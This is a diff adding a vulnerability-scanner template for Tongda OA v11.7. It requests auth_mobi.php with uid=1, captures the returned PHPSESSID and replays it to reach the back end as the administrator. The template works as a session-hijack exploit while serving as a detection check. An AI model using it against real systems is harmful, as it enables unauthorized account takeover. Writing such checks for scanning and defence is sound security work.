@@ -1,0 +1,40 @@
+expression: (r0() && r1()) || r00()
+id: tongda-online-user-session-disclosure-login
+info:
+  author: kzaopa(https://github.com/kzaopa)
+  description: "\u901A\u8FBEOA v11.7 \u4E2D\u5B58\u5728\u67D0\u63A5\u53E3\u67E5\u8BE2\
+    \u5728\u7EBF\u7528\u6237\uFF0C\u5F53\u7528\u6237\u5728\u7EBF\u65F6\u4F1A\u8FD4\
+    \u56DE PHPSESSION\u4F7F\u5176\u53EF\u767B\u5F55\u540E\u53F0\u7CFB\u7EDF\n"
+  name: "\u901A\u8FBEOA Online User Session Disclosure and Login"
+  reference:
+  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20auth_mobi.php%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
+  - https://www.cnblogs.com/T0uch/p/14475551.html
+  - https://s1xhcl.github.io/2021/03/13/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/
+  severity: high
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && !response.body.bcontains(b'RELOGIN') &&
+      response.headers["set-cookie"].icontains("PHPSESSID=")
+    output:
+      phpsessid: search["phpsessid"]
+      search: '"Set-Cookie: PHPSESSID=(?P<phpsessid>.*?)\n".bsubmatch(response.raw_header)'
+    request:
+      method: GET
+      path: /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+  r00:
+    expression: response.body.bcontains(b'RELOGIN') && response.status == 200
+    request:
+      method: GET
+      path: /mobile/auth_mobi.php?isAvatar=1&uid=11121212121212&P_VER=0
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b'loginUser') &&
+      response.body.bcontains(b'uid:1') && response.body.bcontains(b'user_id:') &&
+      response.body.bcontains(b'user_name:')
+    request:
+      follow_redirects: true
+      headers:
+        Cookie: PHPSESSID={{phpsessid}}
+      method: GET
+      path: /general
+    stop_if_match: true
